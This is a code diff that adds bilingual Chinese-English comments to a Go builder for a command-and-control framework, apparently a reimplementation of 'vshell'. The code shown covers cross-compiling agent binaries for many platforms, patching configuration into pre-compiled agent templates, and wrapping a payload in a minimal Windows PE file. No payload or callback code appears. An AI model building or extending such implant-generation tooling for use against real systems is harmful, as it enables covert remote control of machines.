@@ -1,3 +1,6 @@
+// Package c2engine/builder 通过 Go 交叉编译生成 Agent 二进制，并支持预编译模板修补。
+// Package c2engine/builder generates agent binaries via Go cross-compilation and
+// supports patching pre-compiled templates.
 package c2engine
 
 import (
@@ -21,12 +24,15 @@ import (
 
 // ============================================================================
 // Agent Builder - cross-compilation agent binary generation
+// Agent 构建器——通过 Go 交叉编译生成 Agent 二进制
 // ============================================================================
 //
 // The original vshell embeds pre-compiled agent templates and patches them.
 // This reimplementation uses Go cross-compilation to produce real binaries.
+// 原版嵌入预编译模板并修补，本复刻用 Go 交叉编译产出真实二进制。
 
-// AgentBuilder produces real agent binaries via Go cross-compilation
+// AgentBuilder 通过 Go 交叉编译产出真实 Agent 二进制。
+// AgentBuilder produces real agent binaries via Go cross-compilation.
 type AgentBuilder struct {
 	mu         sync.RWMutex
 	agentSrc   string // path to agent source directory
@@ -36,7 +42,8 @@ type AgentBuilder struct {
 	ldflags    string // base ldflags
 }
 
-// CachedAgent holds a compiled agent binary in cache
+// CachedAgent 缓存编译好的 Agent 二进制。
+// CachedAgent holds a compiled agent binary in cache.
 type CachedAgent struct {
 	Data      []byte    `json:"-"`
 	Size      int64     `json:"size"`
@@ -48,7 +55,8 @@ type CachedAgent struct {
 	Config    map[string]string `json:"config"`
 }
 
-// NewAgentBuilder creates an agent builder
+// NewAgentBuilder 创建 Agent 构建器。
+// NewAgentBuilder creates an agent builder.
 func NewAgentBuilder(agentSrcDir, outputDir string) *AgentBuilder {
 	goBin := "go"
 	if gp := os.Getenv("GOROOT"); gp != "" {
@@ -71,7 +79,8 @@ func (ab *AgentBuilder) cacheKey(platform, arch, mode string) string {
 	return fmt.Sprintf("%s_%s_%s", platform, arch, mode)
 }
 
-// BuildAgent produces an agent binary for the given platform/arch/mode
+// BuildAgent 为指定平台/架构/模式构建 Agent 二进制。
+// BuildAgent produces an agent binary for the given platform/arch/mode.
 func (ab *AgentBuilder) BuildAgent(info *AgentBuildInfo, config map[string]string) (*CachedAgent, error) {
 	key := ab.cacheKey(info.Platform, info.Arch, info.Mode)
 
@@ -371,7 +380,8 @@ func (ab *AgentBuilder) exportAgent(agent *CachedAgent, info *AgentBuildInfo) er
 // Batch build all agents
 // ============================================================================
 
-// BuildAllAgents builds agents for all supported platform/arch/mode combinations
+// BuildAllAgents 为所有支持的平台/架构/模式组合批量构建 Agent。
+// BuildAllAgents builds agents for all supported platform/arch/mode combinations.
 func (ab *AgentBuilder) BuildAllAgents(config map[string]string) ([]*CachedAgent, error) {
 	combinations := []struct {
 		Platform string
@@ -406,7 +416,8 @@ func (ab *AgentBuilder) BuildAllAgents(config map[string]string) ([]*CachedAgent
 // Binary patching (for pre-compiled templates)
 // ============================================================================
 
-// PatchAgentWithConfig embeds configuration into a pre-compiled agent binary
+// PatchAgentWithConfig 将配置嵌入预编译的 Agent 二进制。
+// PatchAgentWithConfig embeds configuration into a pre-compiled agent binary.
 func PatchAgentWithConfig(template []byte, config map[string]string) ([]byte, error) {
 	if len(template) < 4 {
 		return nil, fmt.Errorf("template too small")
@@ -452,6 +463,8 @@ func patchByPlaceholder(data []byte, config map[string]string) []byte {
 // Minimal PE header builder (for real PE file generation)
 // ============================================================================
 
+// MinimalPE 创建带嵌入载荷的最小有效 PE EXE 文件：
+// 生成正确的 DOS 头、PE 签名、COFF 头、可选头以及承载载荷的单个 .text 节。
 // MinimalPE creates a minimal valid PE EXE file with embedded payload.
 // Generates a proper DOS header, PE signature, COFF header, optional header,
 // and a single .text section containing the payload.
